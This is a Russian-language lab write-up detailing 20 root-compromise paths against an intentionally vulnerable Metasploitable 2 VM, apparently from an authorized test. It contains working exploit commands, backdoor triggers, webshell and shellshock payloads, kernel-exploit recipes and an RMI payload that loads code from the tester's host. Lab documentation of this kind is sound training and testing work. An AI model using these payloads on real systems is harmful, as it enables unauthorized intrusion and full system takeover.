# Metasploitable 2 — 20 способов получить root

> Лабораторная цель: `192.168.56.104` (Metasploitable 2 в VirtualBox, host-only).
> Сессии 2026-10-15/16/17, волны 1–20. Авторизованный стенд; после каждой волны
> артефакты вычищались, VM возвращена в стоковое состояние.
> Полный отчёт со всеми 74 находками — в `metasploitable2-writeup.md`, этот
> файл — только про root: **20 независимых путей** (апгрейды VNC и NFS
> посчитаны отдельными методами — №14 и №18). В конце — приложение,
> как берётся www-data (старт половины root-чейнов).
> Все команды — реально выполненные на живой VM; ловушки указаны по месту.

## Карта путей

| # | Путь | Вход → root | Волна |
|---|---|---|---|
| 1 | vsftpd 2.3.4 backdoor (CVE-2011-2523) | сеть, без auth → root | 1 |
| 2 | Samba usermap_script (CVE-2007-2447) | сеть, без auth → root | 2 |
| 3 | UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) | сеть, без auth → root | 2 |
| 4 | ingreslock :1524 | сеть, без auth → root | 3 |
| 5 | DRb :8787 instance_eval | сеть, без auth → root | 3 |
| 6 | r-services trust `+ +` (hosts.equiv/.rhosts) | сеть → root | 3 |
| 7 | udev <141 (CVE-2009-1185) | www-data → root (local) | 3 |
| 8 | VNC :5900 password123 → консоль root | сеть → root-десктоп | 3 |
| 9 | NFS no_root_squash → запись в root-ФС | сеть → root file-write | 3 |
| 10 | distccd (CVE-2004-2687) → udev | daemon → root (чейн) | 6 |
| 11 | SUID nmap 4.53 `--interactive` | любой shell → euid=0 | 6 |
| 12 | RMI registry :1099 classloader | сеть → root (root-процесс) | 8 |
| 13 | Dirty COW (CVE-2016-5195) | www-data → перезапись /etc/passwd | 9 |
| 14 | NFS → SUID-бэкдор без единого shell'а | сеть → euid=0 | 10 |
| 15 | msfadmin sudo NOPASSWD: ALL | креды msfadmin → root | 10 |
| 16 | PostgreSQL 8.3 C-UDF → SUID nmap | postgres:postgres → root | 11 |
| 17 | Rogue-DHCP option-12 → shellshock | L2-сеть → root-команда | 13 |
| 18 | VNC → интерактивный root-десктоп (RFB-инъекция) | сеть → root | 15 |
| 19 | SSH key trust: ключ msfadmin в authorized_keys root | msfadmin → root без sudo | 16 |
| 20 | CVE-2017-6074: DCCPv6 pktopts UAF → fake sk_buff → modprobe_path | msfadmin → root (kernel LPE) | 19 |
| ⤷ | **Плацдарм (не root сам по себе): www-data** — 7 веб-векторов: PHP-CGI CVE-2012-1823, WebDAV PUT, TWiki, DVWA upload + LFI2RCE, Mutillidae cmd-inj, TikiWiki graph_formula → `uid=33`; старт для №7/№10/№11/№13/№16 (сниппеты — в приложении) | веб, часто без auth → www-data | 2–14 |

---

## 1. vsftpd 2.3.4 — бэкдор со смайликом (CVE-2011-2523)

Самый дешёвый root на образе. Бэкдор в сборке vsftpd 2.3.4: если в имени
пользователя есть `:)`, демон открывает шелл на порту 6200.

```
$ ftp 192.168.56.104
Name: test:)
Password: x            (любой)
# в другом терминале, через 2–3 секунды:
$ nc 192.168.56.104 6200
# id
uid=0(root) gid=0(root)
```

Ловушка: шелл на :6200 поднимается с задержкой 2–3 с — не торопить
и не закрывать ftp-сессию раньше времени.

## 2. Samba usermap_script (CVE-2007-2447)

`smb.conf` объявляет `username map script = /etc/samba/scripts/mapusers.sh`;
имя пользователя попадает в `sh -c` как root. Достаточно прислать имя
пользователя в обратных кавычках:

```
username = "`/bin/sh -c 'id > /tmp/x'`"
```

Минимальный рабочий payload — голые бэквики без всяких префиксов.
Действия: сырой SMB1 SessionSetupAndX (WordCount=13, **без extended
security**) на :445 → в поле username бэктики с командой → команда
исполняется uid=0.

Ловушки: стандартные SMB-клиенты всегда договариваются о расширенной
безопасности — пакет надо собирать руками; NSE `smb-vuln*` этот бэкдор
не находит (скрипты заточены под Windows).

## 3. UnrealIRCd 3.2.8.1 — бэкдор (CVE-2010-2075)

Троянская сборка ircd: любое сообщение, начинающееся с `AB;`, целиком
передаётся `system()` — от root.

```
$ nc 192.168.56.104 6667
AB; id > /tmp/ircd_proof
```

Главная ловушка: команда исполняется **только после ident/DNS-фазы (~30 с)** —
сокет надо держать открытым или ждать полминуты перед проверкой side-effect.
В бинарнике литерала `AB;` нет (заинлайнен), детект — NSE
`irc-unrealircd-backdoor`. Доказательство через canary-файл: ircd работает
с umask 077, файлы в /var/www отдаются Apache как 403 — это
existence-oracle.

## 4. ingreslock :1524 — бэкдор-шелл без пароля

```
$ nc 192.168.56.104 1524
# id
uid=0(root) gid=0(root)
```

Открытый с 90-х порт с root-shell'ом без единого байта протокола.

## 5. DRb :8787 — instance_eval → root

Сервис `druby_timeserver.rb` запущен от root (через /etc/rc.local) и
принимает DRb-запросы на :8787. dRuby умеет `instance_eval` на удалённом
объекте:

```ruby
require 'drb'
obj = DRbObject.new_with_uri('druby://192.168.56.104:8787')
obj.instance_eval("Kernel.system('id > /tmp/drb_proof')")
```

Доказательство: файл от root (`/tmp` общий). Команда исполняется в процессе
руби-сервиса → uid=0.

## 6. r-services trust — `+ +` в hosts.equiv и .rhosts

`/etc/hosts.equiv`, `/root/.rhosts` и `/home/msfadmin/.rhosts` содержат
`+ +` — доверие любому хосту и любому пользователю. rshd выполняет команду
от root без пароля, если клиент пришёл с привилегированного порта (<1024):

```
$ rsh 192.168.56.104 -l root 'id'     # source port 1015
uid=0(root) gid=0(root)
```

Ловушки: нужен source-порт <1024; внешний ident (:113) может блокироваться
файрволом — в таком случае доказательство делается изнутри VM. На стороне
сервиса перед шеллом возможна пауза на ident/DNS.

## 7. udev <141 (CVE-2009-1185) — www-data → root

udev до 141 не проверяет отправителя NETLINK_KOBJECT_UEVENT и выполняет
`RUN+=` из подделанного сообщения. Классика — 8572.c:

1. `cat /proc/net/netlink` → порт с PID-столбцом >0; portid = udevd_pid − 1.
2. Положить payload `/tmp/run` (копия /bin/bash с SUID + chmod 4755).
3. Послать на netlink-сокет **сырую датаграмму без nlmsghdr** с env
   `REMOVE_CMD=/tmp/run` — обёртка с заголовком молча игнорируется (главная
   ловушка).
4. udev запускает payload от root → `/tmp/run -p -c id` → euid=0.

Работает из любого www-data-контекста (PHP-CGI, WebDAV, DVWA upload).

## 8. VNC :5900 — password123 → консоль root

Xtightvnc :0 крутится от root, на десктопе залогинен root. RFB 3.3 handshake:
сервер сразу шлёт sec-type=2 (VNC auth) и 16-байтный DES-challenge; ответ —
challenge, зашифрованный DES с ключом из пароля `password123`.

Ловушки RFB 3.3: sec-type приходит **u32** (не u8 — однобайтовое чтение
ломает поток), DES-ключ = побитово-зеркальные байты пароля, zero-pad до 8.
После SecurityResult=0 клиент получает управление root-десктопом (см. №18 —
как это превратить в исполнение команд).

## 9. NFS :2049 — no_root_squash → запись в root-файловую систему

`exports`: `/  *(rw,sync,no_root_squash,no_subtree_check)` — весь диск
отдан на запись, и root со стороны клиента не сквошится:

```
# с привилегированного порта (<1024 — требование mountd/nfsd):
mount -t nfs -o port=2049,mountport=<mountd> 192.168.56.104:/ /mnt
echo 'root::0:0:::' > /mnt/etc/passwd   # или SUID-бинарник, или shadow
```

root file-write = root. Ловушки: source-порт <1024 (на Windows bind
нужен либо от админа, либо заранее занятый порт), rpcbind GETPORT
передаёт протокол **u32** (6=tcp), fattr = 68 байт.

## 10. distccd (CVE-2004-2687) → udev → root (чистый чейн)

distcc на :3632 выполняет компиляцию без auth (проверенный NSE
`distcc-cve2004-2687`). Полный чейн без единого лишнего вектора:

1. WebDAV анонимный PUT → залить 8572.c (udev-эксплойт из №7) в /var/www/dav.
2. distcc-командой скомпилировать на цели: `gcc /var/www/dav/8572.c -o /tmp/run`.
3. Записать payload и дёрнуть netlink-триггер (как в №7) → udev исполняет
   `/tmp/run` от root.
4. Канарейка (cat /etc/shadow через http) подтверждает uid=0.

Ловушки: NSE-аргумент `.cmd=` съедает кавычки (только команды без них,
shebang `\#!/bin/sh`), umask udevd 077 → canary читается через Apache
только после `chmod 644`.

## 11. SUID nmap 4.53 — `--interactive`

В образе nmap с SUID-root (дистрибутивный баг настройки). Интерактивный
режим до 5.20 исполняет `!cmd` с сохранённым euid:

```
$ nmap --interactive
nmap> !sh
# id
uid=33(www-data) gid=33(www-data) euid=0(root)
```

Работает из любого контекста: www-data, daemon (distccd), postgres.
Один и тот же «последний метр» для путей №10 и №16.

## 12. RMI registry :1099 — classloader из root-процесса

rmiregistry запущен от root (rc.local). bind() десериализует объект и,
если у класса есть codebase-аннотация, **скачивает класс и исполняет
статический инициализатор** в своём процессе:

1. WebDAV PUT: собранный вручную Java-класс (major 49), в `<clinit>`
   `Runtime.exec("id > /var/www/w8rmi.txt")`.
2. Рукописный JRMP-клиент: handshake `JRMI\x00\x02K`, call 0x50, bind-операция
   с TC_OBJECT + TC_CLASSDESC + TC_STRING-annotation, указывающей на
   `http://192.168.56.1/dav/dummy.class`.
3. Реестр качает класс gnu-classpath-загрузчиком → clinit исполняется →
   файл от root.

Ловушки: registry hash (44154dc9d4e63bdf), objId=0, операция bind=0;
ответ «cannot be cast to java.rmi.Remote» приходит **после** exec —
десериализация раньше cast-проверки. Улика в access-log: UA
`gnu-classpath/0.95 (libgcj/4.2.4)`.

## 13. Dirty COW (CVE-2016-5195) — перезапись /etc/passwd

Ядро 2.6.24 (2008) старше фикса 2016-го. Эксплойт firefart (EDB 40839,
PTRACE_POKETEXT + madvise):

1. WebDAV PUT dirty.c → `gcc -pthread dirty.c -o dirty -lcrypt` (www-data).
2. `nohup ./dirty w9cow &` — гонка выиграна за ~10 с на 1 vCPU.
3. Строка root в /etc/passwd заменена:
   `firefart:fi1IO3cbJQ83.:0:0:pwned:/root:/bin/bash`.
4. Ключевая семантика: **хэш в поле passwd аутентифицирует даже на
   shadowed-системах** — pam_unix читает passwd, если поле не `x`.
5. `telnet 192.168.56.104` → login `firefart` / password `w9cow` →
   `uid=0(firefart) gid=0(root)`.

После пруф passwd восстановлен из бэкапа (md5 сверен).

## 14. NFS → SUID-бэкдор без единого shell'а

Апгрейд №9 до полностью сетевого варианта: root берётся, не открывая ни
одного shell'а и не проходя ни одной аутентификации. Чистый Python
NFSv2-клиент (AUTH_UNIX uid=0/gid=0, source-порт 777):

1. `READ` собственного `/bin/bash` цели (8192-байтные чанки).
2. `CREATE /bash2` (sattr mode 0755, uid=0/gid=0) → `WRITE` блоба.
3. `SETATTR mode=04755` — SUID root.
4. Из любого www-data-примитива: `/bash2 -p -c id` →
   `uid=33(www-data) ... euid=0(root)`.

Wire-ловушки: fattr = **68 байт** (не 76), sattr = **32 байта** (24 →
GARBAGE_ARGS), REMOVE = процедура **10** (12 = LINK), GETPORT протокол =
u32. Локальная очистка — REMOVE.

## 15. msfadmin sudo NOPASSWD: ALL — самый дешёвый root

Слабые креды `msfadmin:msfadmin` (SSH :22 / telnet :23 — из №27/28).
Юзер состоит в группе admin, а в sudoers: `%admin ALL=(ALL) NOPASSWD: ALL`.

```
$ ssh msfadmin@192.168.56.104
$ sudo -l
User msfadmin may run the following commands on this host:
    (ALL) NOPASSWD: ALL
$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

Root без единого эксплойта. Полный live-прогон от входа до root-шелла
подтверждён отдельной директивой «забери root»: sudo-shелл → чтение
/etc/shadow → создание root-owned файла-пробы → клинап.

## 16. PostgreSQL 8.3 — C-UDF → postgres → SUID nmap → root

`postgres:postgres` на :5432 (суперпользователь БД). В PostgreSQL
суперпользователю **разрешён абсолютный путь в `AS`** загружаемой
библиотеки (в отличие от MySQL, которая режет пути ошибкой 1124):

1. WebDAV PUT → gcc на цели: headerless .so (на цели нет
   postgres-заголовков; C-функция `sys_exec(text)` через system()).
2. `CREATE FUNCTION sys_exec(text) RETURNS int AS '/tmp/w11pg.so','sys_exec'
   LANGUAGE C STRICT;`
3. `SELECT sys_exec('id')` → команда исполняется от **postgres** (uid=108).
4. Тем же SQL: `echo '!id' | nmap --interactive` → **euid=0(root)** (№11).

Wire-ловушки PG 8.3: PG_MODULE_MAGIC — структура из 5 int
{20, 803, 100, 32, 64} (version = 803, не (8<<16)|3); СТАРЫЙ порядок полей
FunctionCallInfoData — `arg[0]` на offset 16 (перед argnull[]), иначе сегфолт
бэкенда; varlena — 4-байтовый заголовок.

## 17. Rogue-DHCP option-12 → shellshock → root (сетевой вектор)

dhclient3 3.0.6 + SUID-цепочка `/lib/dhcp3-client/call-dhclient-script` →
`/sbin/dhclient-script` (`#! /bin/bash` 3.2) импортирует переменные
окружения из DHCP-опций как функции — классика shellshock. Отравляется
**option 12 (host-name)**:

```
option 12 = "() { :;}; /bin/bash /tmp/w13sh/p.sh"
```

Свой DHCP-сервер (чистый Python) в сегменте шлёт OFFER/ACK с этой опцией;
dhclient уходит в reboot-цикл, скрипт импортирует env → команда исполняется
**uid=0(root) gid=102(dhcp)**. Финальный payload ставит SUID bash
(`install -m 4755 /bin/bash /tmp/rb`) — персистентный root без единого
пакета к вебу.

Ловушки: гонка с legit-DHCP (наш server-id + fallback-ACK дублём);
в bash func-import работает **одна команда с абсолютным путём**, хвост
значения искажается → план через файл-стейджер; net-guard обязателен
(без него dhclient3 -d оставляет eth0 без адреса).

## 18. VNC → интерактивный root-десктоп (апгрейд №8)

Авторизация VNC (№8) даёт лишь экран; в волне 15 это доведено до исполнения
команд. На десктопе root открыт xterm `root@metasploitable:/#`. Рукописный
RFB-клиент (~170 строк Python, socket + DES + zlib):

1. Auth по password123 (RFB 3.3-квирки из №8).
2. `SetPixelFormat` (32bpp/depth24) + `SetEncodings(raw)` — иначе framebuffer
   не собрать.
3. PointerEvent (click-to-focus по xterm) → KeyEvent'ы (`keysym=ord(ch)`,
   Return = 0xFF0D) печатают `id`.
4. Скриншот: `uid=0(root) gid=0(root)` — двойной пруф: скриншот + файл,
   созданный консолью от root и прочитанный сторонним вектором.

Клинап: `rm` через инъекцию + контроль `[ -e ]` → GONE, `history -c; clear`.

## 19. SSH key trust — ключ msfadmin открывает root

`/root/.ssh/authorized_keys` содержит публичный ключ **msfadmin**
(`id_rsa.pub`, отпечаток сверен `ssh-keygen -lf` с обеих сторон —
57:c3:11:5d:77:c5:63:90:33:2d:c5:c4:99:78:62:7a). Доверие, заложенное
при сборке образа:

```
$ ssh -o BatchMode=yes -i /home/msfadmin/.ssh/id_rsa root@localhost 'id'
uid=0(root) gid=0(root) groups=0(root)
```

Без пароля, без sudo, без эксплойта; переживает ротацию паролей.
«Тихий брат» пути №15. В том же authorized_keys — чужая запись
`root@kali` (2017): задокументирована как улика, **не удалена**.
Контрольный негатив: ключ user→root не работает, но user→msfadmin —
работает (двуххоповая цепочка user→msfadmin→sudo→root; bash_history
подтверждает ручную сборку доверия).

## 20. CVE-2017-6074 — DCCPv6 pktopts UAF (kernel LPE)

Ядро 2.6.24-16-server старше фикса 2017 года и никогда его не получало.
DCCPv6-листенер с `IPV6_RECVPKTINFO` сохраняет входящий `skb` в
`inet6_rsk(req)->pktopts` (+1 refcount), но LISTEN-ветка `input.c` освобождает
его через **`__kfree_skb`**, который игнорирует refcount. `close()` листенера
дёргает `reqsk_destructor` → `kfree_skb(pktopts)` по уже свободному объекту —
UAF. Request-sock живёт `DCCP_TIMEOUT_INIT = 3*HZ` (3 c при HZ=100).

Порт под SLAB/i686 (публичный PoC — SLUB/4.4.x86_64):

1. Listener: AF_INET6, SOCK_DCCP, wildcard `[::]:40000`,
   `IPV6_RECVPKTINFO=1`, `listen()`. Request'ы — на 40000 **с поддельным
   source `::1`**: иначе DCCP перезаписывает `IP6CB.iif` в общем `skb->cb`
   (`dccpd_reset_code=TOO_BUSY` → iif=0x900), Response не маршрутизируется и
   req не создаётся. С `::1` Response уходит через lo.
2. Спрей: 16 SysV-очередей × 97 `msg_msg` с mtext=168 → kmalloc-192 (слит
   со `skbuff_head_cache`); fake sk_buff: `cloned=1`, `fclone=CLONE`,
   `destructor=&ring0`, `end=0x0c000000` (shinfo в user-mm с dataref=2),
   `head=0`, `users=1`, `fclone_ref=2` (за объектом) — освобождение не
   трогает чужую память.
3. `close()` внутри 3-секундного окна → destructor исполняет user-функцию
   `ring0()` (SMEP нет), та переписывает `modprobe_path` на `/tmp/w19p`.
4. `execve` файла с magic `0xffffffff` → ENOEXEC → `request_module` →
   **скрипт исполняется от root**; ставится SUID-bash.

Пруф: `RING0_OK`, `uid=0(root)`, `euid=0(root)` через SUID-bash. После пруфа
`modprobe_path` восстановлен, артефакты удалены. Детали и ловушки — в
`metasploitable2-writeup.md` §7.29 + скилл `ctf-dccp-uaf`.

---

## Послесловие — ядерный аудит волны 20: третьего kernel-пути нет

После №20 ядро проверено сплошняком — от mmap/LSM до спящих модулей.
Вывод: **на этом ядре оружизабельны ровно два независимых kernel-пути —
№13 (Dirty COW) и №20 (DCCP UAF)**; новых нет.

- **NULL-map класс (vmsplice CVE-2008-0600, sock_sendpage CVE-2009-2692) —
  мёртв на двух уровнях.** x86 fault-guard (`address + 65536 + 32*words >=
  esp`) обходится ESP-трюком: `MAP_FIXED|MAP_GROWSDOWN` VMA на 0x10000,
  `esp=0x10000`, fault по адресу 0 — VMA расширяется вниз. Но
  `expand_downwards` → `security_file_mmap` → dummy-LSM требует
  `CAP_SYS_RAWIO` при `addr < mmap_min_addr (65536)`. Живой пруф: root
  получает `NULL_MAPPED`, msfadmin — SIGSEGV с `si_addr=(nil)` и
  сохранившейся VMA `10000-11000`. `mremap(..., MREMAP_FIXED, NULL)` тоже
  EACCES. Класс закрыт.
- **personality(MMAP_PAGE_ZERO)** переживает SUID-exec, но страница 0
  создаётся только при `CAP_SYS_RAWIO` — эскалации не даёт. Traced
  SUID-exec глушит setuid (`Uid: 1000 1000 1000 1000`, `CapEff: 0`); SUID
  nmap + NSE под personality — лишь вариант пути №11.
- **CVE-2013-0871** (ptrace/SIGKILL race): код pre-fix, публичного
  эксплойта нет. **msr CVE-2013-0268**: `/dev/cpu/0/msr` отсутствует,
  узел 0600 root даже при загрузке модуля.
- **econet CVE-2010-3848/3850 — латентный, не непривилегированный.**
  В `af_econet.c` VLA `iov[msg_iovlen+1]`, `UIO_MAXIOV=1024` →
  1025*8 = 8200 байт на 8K-стек; `ec_dev_ioctl` без CAP_NET_ADMIN. Но
  `/etc/modprobe.d/aliases` содержит устаревший `alias net-pf-19 af_econet`
  (модуль — `econet.ko`): `modprobe net-pf-19` → «Module af_econet not
  found», `socket(AF_ECONET)` → EAFNOSUPPORT. Загрузить может только root
  — автозагрузки из непривилегированного контекста нет. half_nelson
  (EDB 17787) к тому же x86_64/2.6.32 и не портирован.

Поэтому в карте выше — по-прежнему 20 путей. Счёт закрыт: ядро 2.6.24
дало ровно два независимых метода, остальная ядерная поверхность либо
закрыта защитами (mmap_min_addr/LSM), либо недостижима без root.

---

## Приложение — как берётся www-data (плацдарм для №7, №10, №11, №13, №16)

Половина root-путей стартует не из сети, а из шелла веб-сервера
`uid=33(www-data)`. Все веб-векторы на образе (каждый — отдельная находка
полного отчёта, здесь — рабочие сниппеты):

**PHP-CGI (CVE-2012-1823)** — Apache + PHP 5.2.4 как CGI принимает
параметры интерпретатора в query string:

```
POST /index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
<?php echo shell_exec("id"); ?>
→ uid=33(www-data) gid=33(www-data)
```

**WebDAV anonymous PUT** — /dav/ принимает PUT без авторизации:

```
PUT /dav/w.php  ← <?php system($_GET['c']); ?>
GET /dav/w.php?c=id   → uid=33(www-data)
```

**TWiki search (CVE-2004-2127)** — инъекция только с разрывом кавычки,
вывод слепой (доказательство через canary-файл):

```
GET /cgi-bin/twiki/search/?search=%27%3B%60cmd%60%3B%27
```

**DVWA file upload (security=low)** — загрузка PHP-вебшелла без фильтра.

**DVWA LFI → RCE** — sink `include($file)` + плант PHP в world-readable:

```
GET /dvwa/vulnerabilities/fi/?page=/tmp/w14lfi.php&c=id   → uid=33(www-data)
```

**Mutillidae command injection** — POST dns-lookup, `;cmd` в имени хоста.

**TikiWiki graph_formula** — валидатор проверяет только 2-й токен формулы:

```
GET /tiki-graph_formula.php?formula=pow(pi,0)%2bsystem($_GET[c])&c=id
```

Из любого из этих контекстов дальше — №7 (udev), №11 (SUID nmap),
№13 (Dirty COW) или стейджинг для №10/№16 (WebDAV PUT компилируемых
исходников).

---

## Что сюда НЕ вошло (честные границы)

- **Tomcat manager** tomcat:tomcat → WAR deploy = shell `tomcat55`, не root.
- **distccd** в одиночку = `daemon`, root только через цепь (№10).
- **MySQL root:password / PostgreSQL superuser** — root БД, не ОС; MySQL
  UDF мёртв (mysqld работает от юзера `mysql`, пути в SONAME режутся,
  AppArmor).
- **PHP-CGI / TWiki / WebDAV / DVWA** = www-data → root только через
  локальную эскалацию (№7/№11/№13).
- **NFS wide-links / Samba traversal** = чтение world-readable файлов,
  не эскалация.
- **root-хэш** из /etc/shadow не вскрыт словарём (rockyou целиком + best64):
  пути №1–№20 root не потребовали.

## Итог

20 путей к root: 6 — без аутентификации по сети (№1–№5, №12), 2 — доверие
(№6, №19), 2 — креды+sudo (№15, №16), 3 — ядерные/SUID локальные (№7, №11,
№13), 1 — kernel LPE (№20), 2 — NFS-семейство (№9, №14), 3 — сетевые чейны
с эскалацией (№10, №17, №18) и VNC-сессия (№8). Один и тот же рут можно
забрать через разные независимые слои: бэкдоры сервисов, доверие хостов,
ядро, SUID-баги, слабые креды.

Волна 20 (сплошной ядерный аудит) новых путей не добавила — **20 путей,
финальный счёт**: ядро 2.6.24 дало ровно два независимых метода (№13 Dirty
COW и №20 DCCP UAF).
